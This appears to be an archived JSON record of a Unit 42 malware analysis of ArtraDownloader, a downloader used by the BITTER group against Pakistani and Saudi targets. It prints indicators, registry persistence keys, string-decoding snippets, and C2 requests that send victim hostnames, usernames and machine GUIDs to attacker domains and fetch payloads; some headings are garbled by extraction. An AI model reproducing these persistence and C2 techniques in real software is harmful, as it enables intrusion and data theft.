{
    "id": "0111611e-06ed-4cb3-9cff-31bc7ce8e396",
    "created_at": "2023-01-12T15:07:00.102904Z",
    "updated_at": "2025-03-27T02:09:20.723391Z",
    "deleted_at": null,
    "sha1_hash": "f97047716f575b9cbf43ddd2363857d3e545967c",
    "title": "2019-02-25 - Multiple ArtraDownloader Variants Used by BITTER to Target Pakistan",
    "authors": "",
    "file_creation_date": "2022-05-28T02:14:13Z",
    "file_modification_date": "2022-05-28T02:14:13Z",
    "file_size": 285368,
    "plain_text": "# Multiple ArtraDownloader Variants Used by BITTER to Target Pakistan\n\n**[unit42.paloaltonetworks.com/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/](https://unit42.paloaltonetworks.com/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/)**\n\nJosh Grunzweig, Brittany Barbehenn February 25, 2019\n\nBy [Josh Grunzweig and](https://unit42.paloaltonetworks.com/author/joshgruznweig/) [Brittany Barbehenn](https://unit42.paloaltonetworks.com/author/brittany-ash/)\n\nFebruary 25, 2019 at 6:00 AM\n\n[Category: Unit 42,](https://unit42.paloaltonetworks.com/category/unit-42/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [artradownloader,](https://unit42.paloaltonetworks.com/tag/artradownloader/) [Bitter](https://unit42.paloaltonetworks.com/tag/bitter/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/)\n\n## Executive Summary\n\n[Since at least 2015, a suspected South Asian threat grouping known as BITTER has been targeting Pakistan and Chinese organizations using](https://ti.360.net/blog/articles/analysis-of-targeted-attack-against-pakistan-by-exploiting-inpage-vulnerability-and-related-apt-groups-english/)\nvariants of a previously unreported downloader. We have named this malware family ArtraDownloader based on a PDB string discovered\nwithin the samples. We’ve observed three variants of this downloader with the earliest timestamp of February 2015. This downloader has\n[frequently been observed downloading the Remote Access Trojan (RAT) BitterRAT which is associated with BITTER threat operations.](https://www.forcepoint.com/blog/security-labs/bitter-targeted-attack-against-pakistan)\n\nStarting in September 2018 and continuing through the beginning of 2019, BITTER launched a wave of attacks targeting Pakistan and Saudi\nArabia. This is the first reported instance of BITTER targeting Saudi Arabia. Details surrounding these attacks and the three ArtraDownloader\nvariants observed are described below.\n\n## Activities\n\nBetween mid-September 2018 and January 2019, Unit 42 observed the ArtraDownloader used in the targeting of Pakistan and Saudi Arabian\norganizations. Several malicious documents have been identified, all communicating with likely compromised, legitimate Pakistan websites to\nretrieve the payload. These websites include those associated with the Pakistan government and other Pakistan organizations.\n\nBeginning on Sep 12, 2018, we observed files with the following names hosted on the URL https://wforc[.]pk/js/.\n\nInternet Data Traffic Report – August 2018.docx\nPAF Webmail Security Report.doc.exe\n\nThe presumed spear phish targeted an employee of an organization in Saudi Arabia. The malicious file communicated with the C2\nnethosttalk[.]com.\n\nAround the same timeframe, two additional files (listed below) were observed being hosted on another Pakistan website. These executables,\nwhich had the following names, were hosted on the URL khurram.com[.]pk/js/drvn and communicated with the domain nethosttalk[.]com for\nC2.\n\nHandling of Logistics.pdf[.]com\nCyber security work shop.pdf[.]com\n\nBeginning on Nov 6, 2018, the URL http://rmmun.org[.]pk/svch was observed hosting two ArtraDownloader files that communicated with the\ndomains info.viewworld71[.]com or hewle.kielsoservice[.]net. The RMMUN, Roots Metropolitan Model United Nations, is an organized event\nthat was held on November 8-11, 2018 which fosters collaboration and insights into issues such as human rights and economic development.\n\nBetween November 2018 and January 2019, an engineering and hydraulics company in Pakistan, almasoodgroup[.]com was observed hosting\ntwo AtraDownloader executables as well as a malicious document used to deliver a payload. One of the files, Port Details.doc is an RTF\n[document crafted to exploit the EQNEDT vulnerability CVE-2017-11882. This file downloaded a payload that also communicated with the](https://nvd.nist.gov/vuln/detail/CVE-2017-11882)\ndomain hewle.kielsoservice[.]net. The other two files hosted on the engineering company’s domain communicated with command and control\ndomain xiovo426[.]net.\n\nOn 2 Jan 19, the file article_amy.doc was also uploaded into VirusTotal. This document was hosted on almasoodgroup[.]com/js/cwqj and\ncommunicated with C2 domain thepandaservices.nsiagenthoster[.]net. The domain almasoodgroup[.]com appears to be a legitimate but\ncompromised domain in this particular instance.\n\nOn December 17 and 18 2018, a file was downloaded from http://fst.gov[.]pk/images/winsvc (SHA256: ef0cb0a1…) after a user accessed the\ndocument cocktail and the dinner in the last week of dec.doc. We do not know how the user was initially enticed to execute this document. This\npayload is an instance of ArtraDownloader variant 1 exploits CVE-2017-11882 (EQNEDT). In this case it was observed using the command\nand control domain of hewle.kielsoservice[.]net/Engset.php.\n\n\n-----\n\n### a a t Co pa so\n\nIn total, roughly 80 unique instances of the ArtraDownloader malware family have been discovered. Within these samples, 3 distinct variants\nare identified. These variants generally have minor changes between them, specifically as it pertains to string obfuscation, as well as HTTP\nrequests.\n\nThe earliest sample identified belonging to ArtraDownloader has a compile timestamp of February 2015, which provides a rough outline as to\nhow old this malware family is.\n\nTo date, Unit 42 has only observed this malware family downloading and executing instances of the RAT malware family associated with\nBITTER. A breakdown as to when each identified sample was compiled is as follows:\n\nFigure 1 Timeline of ArtraDownloader variants based on compile timestamps\n\nOverall, the ArtraDownloader malware family is not sophisticated, leveraging simple registry keys for persistence and HTTP requests to\ndownload and execute a remote file. Important strings within these samples are obfuscated by adding or subtracting from each byte within a\nstring. This same obfuscation routine is used when sending data via HTTP.\n\n[Of interest, during this analysis we discovered infrastructure use overlap seen in a previously analyzed payload. In November 2017 we](https://unit42.paloaltonetworks.com/unit42-recent-inpage-exploits-lead-multiple-malware-families/)\nreported on malicious documents that were downloaded from the domain zmwardrobe[.]com and subsequently executed a payload referred to\nas MY24. This activity was observed through September and October 2017. In November 2017, we first observed ArtraDownloader querying\nthe same domain; this continuing through February 2018. Both payloads were observed in InPage exploits.\n\nFor more information about the variants discovered and an in-depth analysis on each, please refer to the Appendix.\n\n## Conclusion\n\nTo date, the threat actor commonly referred to as BITTER continues to be active against various regions across the globe. They are observed\ntargeting Pakistan, China, and Saudi Arabia using a customized downloader malware family named ArtraDownloader. This downloader,\nleveraging unique custom obfuscation routines downloads and executes the BitterRAT malware family via HTTP.\n\nMultiple organizations have been affected or found to be hosting the malware used by BITTER, including the Pakistan government, an\nengineering company, and an electrical provider. We will continue to monitor this threat actor in the future. Palo Alto Networks customers are\nprotected against this threat in the following ways:\n\nAll malware is appropriately classified as malicious in WildFire\nDomains being used for communication by malware and URLs hosting malware are flagged as malicious\nAutoFocus customers may use the BITTER, BITTERRAT, and ArtraDownloader tags for continued tracking of this threat.\n\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat\nAlliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious\ncyber actors. For more information on the Cyber Threat Alliance, visit cyberthreatalliance.org.\n\n## Appendix\n\n### ArtraDownloader Malware Analysis – Variant 1\n\nFor the remainder of the analysis, the following file is used:\n\n**MD5** 7cc0b212d1b8ceb808c250495d83bae4\n\n**SHA1** d2c161ce52240b61d632607a2262890327d82502\n\n**SHA256** ef0cb0a1a29bcdf2b36622f72734aec8d38326fc8f7270f78bd956e706a5fd57\n\n\n-----\n\n**Compile Timestamp** 2018-12-06 11:14:45 UTC\n\nTable 1 ArtraDownloader Variant 1 Sample\n\nUpon execution, the sample will create and register a new window class with the following properties:\n\nWindow Name: seal\n\nClass Name: SEAL\n\nUpon receiving a WM_CREATE message in this newly created window class, it will execute a new function after 20 seconds via a call to\nSetTimer(). This function is responsible for actually downloading and executing a remote payload and will only be called at the end of the\nmalware’s execution.\n\nArtraDownloader continues to collect the following information from the victim machine:\n\nComputer name\nOperating system\nUsername\n\nThroughout the malware’s execution, various strings are encoded to avoid detection. The following Python code may be used to decode these\nstrings:\n\ndef decode(data):\n\nout = \"\"\n\nfor d in data:\n\nout += chr(ord(d)-1)\n\nreturn out\n\nExample:\n\n>> print(decode(\"ifxmf/ljfmtptfswjdf/ofu\"))\n\n>> hewle.kielsoservice[.]net\n\nIt then attempts to acquire the following folder paths. The first successfully identified folder will be used.\n\nTEMPLATES\nNETHOOD\nAPPDATA\n\nThe ctfmon.exe file is appended to this path, which will be the destination ArtraDownloader copies itself too in the event this file does not\nalready exist.\n\nThe malware then attempts to acquire the following folder paths. The first successfully identified folder will be used.\n\nNETHOOD\nTEMPLATES\nAPPDATA\n\nThe perfc file is appended to this path, which will be the temporary destination the malware uses when downloading a remote file.\n\nThe downloader proceeds to identify the victim’s machine GUID via the HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid registry key.\nIf this key is successfully queried, a string with the following data is formatted:\n\n[Computer Name]##[Username]@@[Machine GUID]\n\nOtherwise, the following string is generated:\n\n[Computer Name]!@[Username]\n\nThis information will be used in subsequent network requests. In order to ensure persistence, the malware modifies the host’s registry to\naccomplish this. The following two keys are set:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\JITDfbug - \"cmd /c start %Qrp% && exit\"\n\nHKCU\\Environment\\Qrp - [path]\\ctfmon.exe\n\n\n-----\n\ne e [pat ] s t e p e ous y c ose pat e e t a o oade as cop ed tse ese t o eg st y ey od cat o s e su e t at t e\nmalware executes every time the victim machine starts.\n\nAt this point in the malware’s execution flow, the previously discussed function that is executed on a 20 second timer will ultimately run. It will\nbegin by making the following example POST request to the remote C2 server:\n\nPOST /Engset.php HTTP/1.0\n\nHost: hewle.kielsoservice[.]net\n\nConnection: keep-alive\n\nContent-type: application/x-www-form-urlencoded\n\nContent-length: 148\n\nBCDEF=XJO.82GO2QF2BU9&MNOPQ=Xjoepxt!8!Vmujnbuf&GHIJ=Kpti!Hsvo{xfjh&UVWXYZ=XJO.82GO2QF2BU9$$Kpti!Hsvo{xfjhAA214cf8g5.\n\nIn this request, the POST data is encoded using the same technique witnessed on the strings. Upon decoding them, we are presented with the\nfollowing:\n\n\n**POST**\n**Variable**\n\n\n**Description** **Decoded Example**\n\n\nBCDEF Hostname WIN-71FN1PE1AT8\n\nMNOPQ Microsoft Windows Version Windows 7 Ultimate\n\nGHIJ Username Josh Grunzweig\n\n\nUVWXYZ Previously created string used as a unique identifier for the\nvictim\n\nst Boolean value indicating if previously downloaded file\nexecuted successfully.\n\nTable 2 Decoded POST requests in ArtraDownloader Variant 1\n\n\nWIN-71FN1PE1AT8##Josh Grunzweig@@103be7f4-bfb8-40fa803c-e06bdf9d3bb6\n\n0\n\n\nThe expected response is as follows, where ‘qbzmpbe’ is the example encoded executable name (decoded: ‘payload’) that will be downloaded\nand executed:\n\nDFCB=DWN qbzmpbe<br>\n\nAfter the expected response is returned by the remote C2 server, ArtraDownloader will make the following POST request:\n\nThe above example request is using the same unique identifier that was witnessed in the previous request’s UZWXYZ POST variable.\n\nThe remote C2 server expects the response to be of the following format:\n\nexe[hex-encoded data]&lt\n\nWhere [hex-encoded data] is the hex-encoded payload binary. The raw response is written to the perfc file, such as in the following example\nfrom a mock C2 server:\n\nHTTP/1.0 200 OK\n\nContent-Type: text/html; charset=utf-8\n\nContent-Length: 28\n\nServer: Werkzeug/0.12.2 Python/2.7.15\n\nDate: Tue, 08 Jan 2019 18:46:23 GMT\n\nexe68656c6c6f20776f726c64&lt\n\nAfter this file is written, the malware proceeds to decode the hex-encoded data and writes this to the previously defined filename in the same\npath as perfc. In our example from earlier, since payload was provided as the filename, this particular payload would be written to payload.exe.\nUsing our example from the mock server, this file would contain the string hello world.\n\nAt this stage, the malware proceeds to open this newly created executable in a new process via a call to ShellExecuteA(). Should this be\nsuccessful, ArtraDownloader will make a subsequent HTTP request to /Engset.php with the same POST parameters. However, in this request,\nthe st POST variable is set to 1\n\n\n-----\n\n### t a o oade a a e a ys s a a t\n\nFor the remainder of the analysis, the following file is used:\n\n**MD5** 8d42c01180be7588a2a68ad96dd0cf85\n\n**SHA1** 89a7861acb7983ad712ae9206131c96454a1b3d8\n\n**SHA256** 0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0\n\n**Compile Timestamp** 2019-01-07 07:13:47 UTC\n\n**PDB String** c:\\Users\\Asterix\\Documents\\Visual Studio 2008\\Projects\\28NovDwn\\Release\\28NovDwn.pdb\n\nTable 3 ArtraDownloader Variant 2 Sample\n\nUpon execution, the sample will create and register a new window class with the following properties:\n\nWindow Name: 28NovDwn\n\nClass Name: MY28NOVDWN\n\nThe malware proceeds to decode a series of strings using a simple routine. The following Python script may be used to decode strings\nbelonging to this cluster:\n\ndef decode(data):\n\nout = \"\"\n\nfor d in data:\n\nout += chr((ord(d)-3)&0xFF)\n\nreturn out\n\n>> print(decode(“iudphzrunvxssruw1qhw”))\n\n>> frameworksupport[.]net\n\nIt proceeds to attempt to create the C:\\intel\\ directory, which is where various files will eventually be stored. It creates the following registry if it\ndoesn’t already exist with the intent of persisting on the victim machine:\n\nHKCU\\Environment\\AppId – c:\\intel\\msdtcv.exe\n\nArtraDownloader then sets the following registry key to ensure that the malware executes across reboots.\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run – cmd /c start %AppId% && exit\n\nAdditionally, in a separate thread, the malware will spawn a new process to copy itself to the C:\\intel\\msdtcv.exe path.\n\nVarious information about the victim machine is collected, including information about the operating system, the machine’s GUID, as well as\nthe hostname. This information will ultimately be used to both identify the victim and provide general information about the infected host.\n\nThe following example GET request is made to the remote C2 server:\n\nGET /ourtyaz/qwe.php?\nTIe=214cf8g5.cgc9.51gb.914d.f17ceg%3ae4cc7*XJO.82GO2QF2BU9*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212\nHTTP/1.1\n\nHost: frameworksupport[.]net\n\nConnection: close\n\nIn the example request above, the data supplied in the TIe GET variable is separated by a * and the remaining data is encoded by adding one\nto each byte. Decoding this string, we are presented with the following:\n\n103be7f4-bfb8-40fa-803c-e06bdf9d3bb6*WIN-71FN1PE1AT8*9@Bld: 6.1.7601 Service Pack 1\n\nThe data above includes the machine’s GUID, the victim’s hostname, as well as information about the operating system. This particular GET\nrequest is looking for the AXE: identifier, as witnessed in the following C2 response:\n\nHTTP/1.1 200 OK\n\n\n-----\n\no e ed y /5 6 36\n\nContent-Type: text/html; charset=UTF-8\n\nContent-Length: 23\n\nDate: Tue, 20 Nov 2018 22:27:56 GMT\n\nAccept-Ranges: bytes\n\nServer: LiteSpeed\n\nConnection: close\n\nAXE: #wscspl#\n\nSIZE: ##\n\nIn this response, the data between the # is parsed, and a subsequent request is made. Should this information be present in the response, the\nmalware will query the CSIDL_HISTORY folder, which represents the file system directory that serves as a common repository for Internet\nhistory items. This path has the string ZX appended to it, followed by the filename used in the HTTP response, which in our example was\nwscspl. An example of this is as follows:\n\nC:\\Users\\[username]\\AppData\\Local\\Microsoft\\Windows\\HistoryZXwscspl\n\nThe HTTP request for data that will be supplied to this newly formed file path is as follows:\n\nGET /ergdfbd/wscspl HTTP/1.1\n\nHost: frameworksupport[.]net\n\nConnection: Close\n\nThe entire HTTP response is written to the previously described file path. ArtraDownloader will then parse this entire HTTP response’s POST\ndata, extracting everything at offset 0x1 to a file path without the ZX characters, and with the .exe extension. Using our previous example, this\nfile would be the following:\n\nC:\\Users\\[username]\\AppData\\Local\\Microsoft\\Windows\\Historywscspl.exe\n\nThe previously written file containing ZX in the path is removed. Finally, this file is executed in a new process. If this executable is spawned\nwithout errors, the malware will send the following example final HTTP request:\n\nGET /ourtyaz/dwnack.php?cId=214cf8g5.cgc9.51gb.914d.f17ceg%3ae4cc7 HTTP/1.1\n\nHost: frameworksupport[.]net\n\nConnection: Close\n\n### ArtraDownloader Malware Analysis – Variant 3\n\nFor the remainder of the analysis, the following file is used:\n\n**MD5** a1bdb1889d960e424920e57366662a59\n\n**SHA1** 177837d0fa5bfd274abe79d80a01cfe2374b4cd9\n\n**SHA256** f0ef4242cc6b8fa3728b61d2ce86ea934bd59f550de9167afbca0b0aaa3b2c22\n\n**Compile Timestamp** 2018-07-30 09:18:37 UTC\n\n**PDB String** d:\\C++\\new_downloader_aroundtheworld123\\Release\\audiodq.pdb\n\nTable 4 ArtraDownloader Variant 3 Sample\n\nUpon execution, the malware begins by decoding a series of strings via a simple decoding routine. The following Python script may be used to\ndecode strings belonging to this cluster:\n\ndef decode(data):\n\nout = \"\"\n\nfor d in data:\n\n\n-----\n\nout c ((o d(d) 3)&0 )\n\nreturn out\n\n>> print(decode(binascii.unhexlify(\"6E7F7C827B71817572847C7F79713E3F403B7B7281\")))\n\n>> aroundtheworld123[.]net\n\nThe malware proceeds to check to determine if the AVG security product is currently running on the system, however, this information does not\nappear to be used by ArtraDownloader. It is possible that this might have been a remnant of testing being performed by the malware author\nthat was unintentionally left within the sample.\n\nVarious information about the system is collected by the malware and used in subsequent HTTP requests. After this information is collected,\nthe following example HTTP GET request is performed:\n\nGET ///healthne/accept.php?a=WIN-71FN1PE1AT8&b=WIN-71FN1PE1AT8&c=Windows%207%20Ultimate&d=Josh GrunzweigJosh\nGrunzweig103be7f4-bfb8-40fa-803c-e06bdf9d3bb6365536040965860&e= HTTP/1.1\n\nHost: aroundtheworld123[.]net\n\nNote that unlike other variants witnessed in this malware family, this particular variant does not obfuscate data being sent across the network.\nThe following GET parameters are used within this request:\n\n\n**GET**\n**Variable**\n\n\n**Description**\n\n\na Hostname\n\nb Computer name\n\nc Operating system version\n\nd Unique string containing two instances of the victim’s username, the machine’s GUID, as well as various information queried\nvia a call to GetSystemInfo()\n\ne A variable that does not appear to be used within this particular sample\n\nTable 5 GET Parameters Observed in ArtraDownloader Variant 3\n\nAn example response to this request can be seen below.\n\nHTTP/1.1 200 OK\n\nContent-Type: text/html; charset=UTF-8\n\nContent-Length: 29\n\nDate: Mon, 05 Nov 2018 19:22:56 GMT\n\nAccept-Ranges: bytes\n\nServer: LiteSpeed\n\nConnection: Keep-Alive\n\nYes file58368[regdl]35No file\n\nThe response to this request is parsed, specifically attempting to identify the string Yes file. Should this string be present, the data between [\nand ] is parsed. This data is used in a subsequent HTTP request made that will download a file from the remote server, as seen below:\n\nGET /healthne/healthne/regdl HTTP/1.0\n\nHost: aroundtheworld123[.]net\n\nHTTP/1.0 200 OK\n\nLast-Modified: Tue, 02 Oct 2018 04:38:28 GMT\n\nContent-Type: application/octet-stream\n\nContent-Length: 58368\n\nDate: Mon, 05 Nov 2018 19:23:01 GMT\n\n\n-----\n\nccept a ges bytes\n\nServer: LiteSpeed\n\nConnection: close\n\nMZ......................[TRUNCATED]\n\nThis executable file is written to the same directory as the malware and uses the same name provided. As an example, should this malware\noriginally be executed from C:\\, the downloaded file would be written to C:\\regdl.exe. Finally, this executable is run in a new process.\n\n## Indicators of Compromise\n\nPlease refer to the following link for a CSV file containing all relevant IOCs:\n\nhttps://github.com/pan-unit42/iocs/tree/master/bitter\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-02-25 - Multiple ArtraDownloader Variants Used by BITTER to Target Pakistan.pdf"
    ],
    "report_names": [
        "2019-02-25 - Multiple ArtraDownloader Variants Used by BITTER to Target Pakistan.pdf"
    ],
    "threat_actors": [
        {
            "id": "bf6cb670-bb69-473f-a220-97ac713fd081",
            "created_at": "2022-10-25T16:07:23.395205Z",
            "updated_at": "2025-03-27T02:02:09.777308Z",
            "deleted_at": null,
            "main_name": "Bitter",
            "aliases": [
                "T-APT-17",
                "TA397"
            ],
            "source_name": "ETDA:Bitter",
            "tools": [
                "Artra Downloader",
                "ArtraDownloader",
                "Bitter RAT",
                "BitterRAT",
                "Dracarys"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "655f7d0b-7ea6-4950-b272-969ab7c27a4b",
            "created_at": "2022-10-27T08:27:13.133291Z",
            "updated_at": "2025-03-27T02:00:55.490812Z",
            "deleted_at": null,
            "main_name": "BITTER",
            "aliases": [
                "T-APT-17"
            ],
            "source_name": "MITRE:BITTER",
            "tools": [
                "ZxxZ"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536020,
    "ts_updated_at": 1743041360,
    "ts_creation_date": 1653704053,
    "ts_modification_date": 1653704053,
    "files": {
        "pdf": "https://archive.orkl.eu/f97047716f575b9cbf43ddd2363857d3e545967c.pdf",
        "text": "https://archive.orkl.eu/f97047716f575b9cbf43ddd2363857d3e545967c.txt",
        "img": "https://archive.orkl.eu/f97047716f575b9cbf43ddd2363857d3e545967c.jpg"
    }
}